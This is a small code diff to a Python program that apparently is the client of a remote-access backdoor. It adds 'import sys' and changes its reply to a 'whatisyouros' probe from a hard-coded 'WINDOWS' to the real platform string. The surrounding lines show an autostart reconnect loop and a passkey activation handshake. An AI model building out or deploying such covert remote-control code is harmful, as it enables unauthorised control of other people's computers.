@@ -6,6 +6,7 @@ import time
 import os
 import subprocess
 import ctypes
+import sys
 
 HOST = '127.0.0.1'
 PORT = 4434
@@ -89,7 +90,7 @@ def fromAutostart():
                     time.sleep(10)
             data = Receive(s)
             if data == 'whatisyouros':
-                Send(s, 'WINDOWS')
+                Send(s, str(sys.platform))
             if data == passKey:
                 active = True
                 Send(s, 'iamactive')
